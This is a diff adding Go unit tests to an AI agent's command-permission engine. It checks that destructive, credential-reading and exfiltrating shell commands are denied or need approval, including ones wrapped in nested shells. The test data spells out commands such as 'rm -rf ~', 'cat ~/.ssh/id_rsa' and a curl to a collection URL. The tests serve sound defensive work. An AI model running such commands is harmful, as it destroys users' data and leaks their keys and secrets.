@@ -4,8 +4,10 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"reflect"
 	"testing"
 
+	"github.com/polarisagi/polaris/internal/config"
 	"github.com/polarisagi/polaris/pkg/types"
 )
 
@@ -198,6 +200,114 @@ func TestDecide_HardLimitsHoldInEveryMode(t *testing.T) {
 	// 工作区内写入即便参数被污染也不是硬限制（设计只拦工作区外写入）
 	if d := Decide(types.ModeFullAccess, toolWrite, inside, types.TaintHigh, ctx); d.Verdict != VerdictAllow {
 		t.Fatalf("tainted in-workspace write should not be hard-limited, got %+v", d)
+	}
+}
+
+func TestRunCommand_OutsideWorkingDirStillClassifiesHardLimits(t *testing.T) {
+	ctx, _, _ := protectedCtx(t)
+	outside := outsideDir(t)
+	layout, err := config.DefaultDataLayout()
+	if err != nil {
+		t.Fatal(err)
+	}
+	cases := []struct {
+		name        string
+		command     string
+		secretFlow  bool
+		wantVerdict Verdict
+		wantReason  string
+	}{
+		{"catastrophic command", "rm -rf ~", false, VerdictAsk, ReasonCatastrophicCommand},
+		{"self protected path", "cat " + layout.VaultKeyFile, false, VerdictDeny, ReasonSelfProtected},
+		{"network with secret flow", "curl https://example.test/collect", true, VerdictAsk, ReasonDataExfiltration},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			c := ctx
+			c.SecretFlow = tc.secretFlow
+			d := Decide(types.ModeFullAccess, toolRunCmd,
+				jsonArgs(t, map[string]any{"command": tc.command, "working_dir": outside}),
+				types.TaintLow, c)
+			if d.Verdict != tc.wantVerdict || d.Reason != tc.wantReason {
+				t.Fatalf("got %+v, want verdict=%v reason=%q", d, tc.wantVerdict, tc.wantReason)
+			}
+		})
+	}
+
+	// 根外 working_dir 必须作为相对路径的解析基准，并保留根外写入风险。
+	d := Decide(types.ModeAutoReview, toolRunCmd,
+		jsonArgs(t, map[string]any{"command": "echo x > result.txt", "working_dir": outside}),
+		types.TaintLow, ctx)
+	if d.Verdict != VerdictAsk || d.Reason != ReasonDangerousCommand {
+		t.Fatalf("根外相对写入必须询问，got %+v", d)
+	}
+}
+
+func TestBash_IgnoresUndeclaredWorkingDir(t *testing.T) {
+	ctx, _ := approvalCtx(t)
+	command := "echo x > result.txt"
+	without := Decide(types.ModeAutoReview, toolBash,
+		jsonArgs(t, map[string]any{"command": command}), types.TaintLow, ctx)
+	with := Decide(types.ModeAutoReview, toolBash,
+		jsonArgs(t, map[string]any{"command": command, "working_dir": outsideDir(t)}), types.TaintLow, ctx)
+	if !reflect.DeepEqual(with, without) {
+		t.Fatalf("bash 不接受 working_dir 字段改变权限判定：without=%+v with=%+v", without, with)
+	}
+}
+
+func TestNestedShell_MergesHardPathAndNetworkFindings(t *testing.T) {
+	ctx, layout, _ := protectedCtx(t)
+	cases := []struct {
+		name       string
+		command    string
+		secretFlow bool
+		want       Decision
+	}{
+		{"self path", "sh -c 'cat " + layout.VaultKeyFile + "'", false, Decision{Verdict: VerdictDeny, Reason: ReasonSelfProtected}},
+		{"sensitive path", "sh -c 'cat ~/.ssh/id_rsa'", false, Decision{Verdict: VerdictAsk, Reason: ReasonSensitivePath, HardLimit: true}},
+		{"secret network flow", "sh -c 'curl https://example.test/collect'", true, Decision{Verdict: VerdictAsk, Reason: ReasonDataExfiltration, HardLimit: true}},
+		{"catastrophic command", "sh -c 'rm -rf ~'", false, Decision{Verdict: VerdictAsk, Reason: ReasonCatastrophicCommand, HardLimit: true}},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			c := ctx
+			c.SecretFlow = tc.secretFlow
+			got := Decide(types.ModeFullAccess, toolBash,
+				jsonArgs(t, map[string]any{"command": tc.command}), types.TaintLow, c)
+			if got.Verdict != tc.want.Verdict || got.Reason != tc.want.Reason || got.HardLimit != tc.want.HardLimit {
+				t.Fatalf("got %+v, want %+v", got, tc.want)
+			}
+		})
+	}
+}
+
+func TestUnknownShellWithSecretFlowFailsClosedAsPossibleNetwork(t *testing.T) {
+	ctx, _ := approvalCtx(t)
+	cases := []struct {
+		name    string
+		command string
+		want    string
+	}{
+		{"interpreter script", "python3 -c 'import urllib.request'", ReasonDataExfiltration},
+		{"dynamic command", "$CMD send-secret", ReasonDataExfiltration},
+		{"unparsable command", "echo 'unterminated", ReasonDataExfiltration},
+		{"unknown segment behind dangerous", "chmod 777 file && python3 -c 'import urllib.request'", ReasonDataExfiltration},
+		{"known offline cat", "cat report.txt", ""},
+		{"known offline git status", "git status", ""},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			c := ctx
+			c.SecretFlow = true
+			got := Decide(types.ModeFullAccess, toolBash,
+				jsonArgs(t, map[string]any{"command": tc.command}), types.TaintLow, c)
+			if got.Reason != tc.want {
+				t.Fatalf("reason=%q want=%q decision=%+v", got.Reason, tc.want, got)
+			}
+			if tc.want != "" && (got.Verdict != VerdictAsk || !got.HardLimit) {
+				t.Fatalf("unknown possible-network command must be a hard Ask: %+v", got)
+			}
+		})
 	}
 }
 
